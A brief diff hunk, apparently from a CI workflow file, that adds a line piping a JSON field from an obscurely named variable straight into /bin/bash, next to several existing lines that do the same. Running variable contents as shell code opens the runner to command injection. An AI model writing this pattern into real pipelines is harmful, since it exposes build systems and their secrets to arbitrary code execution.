@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$c9" | jq -r .km1 | /bin/bash
           printf '%s' "$r88202" | jq -r .ska650 | /bin/bash
           printf '%s' "$qvuml4688" | jq -r .ttj6120 | /bin/bash
+          echo $bngw68 | jq -r .znz8 | /bin/bash
 
       - name: Store results
         if: always()
